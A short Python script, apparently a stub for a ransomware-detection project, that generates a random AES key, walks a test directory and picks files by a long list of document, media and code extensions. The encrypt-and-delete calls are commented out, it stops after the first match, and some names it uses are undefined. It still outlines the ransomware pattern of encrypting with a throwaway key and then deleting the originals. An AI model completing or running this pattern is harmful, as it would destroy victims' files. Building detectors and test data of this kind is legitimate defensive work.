import random
import string
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
import threading
import os
import sys
from os import walk

def encrypt_all_files():
    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32)) 
    ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
    for root, dirs, files in os.walk("/TestFiles", topdown=True):  # iterate from home
        for filename in files:
            if filename.endswith(ext) and not filename.startswith(encrypted_symbol):  
                try:
                    key = SHA256.new(password.encode('utf-8')).digest()  
                    filepath = os.path.abspath(os.path.join(root, filename))
                    print("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
                    # encrypt_file(key, filename, filepath)  # calls the encrypt function
                    # os.remove(filepath)  # deletes the file
                    break
                except:
                    pass
        break

def GetAllFiles(dirName):
    # create a list of file and sub directories 
    # names in the given directory 
    listOfFile = os.listdir(dirName)
    allFiles = list()
    # Iterate over all the entries
    for entry in listOfFile:
        # Create full path
        fullPath = os.path.join(dirName, entry)
        # If entry is a directory then get the list of files in this directory 
        if os.path.isdir(fullPath):
            allFiles = allFiles + GetAllFiles(fullPath)
        else:
            allFiles.append(fullPath)
                
    return allFiles

###################### main ######################

basePath = "/home/ohadoz/Desktop/RansomwareDetection/TestData/output/TestFiles"
files_list = GetAllFiles(basePath)
print(files_list)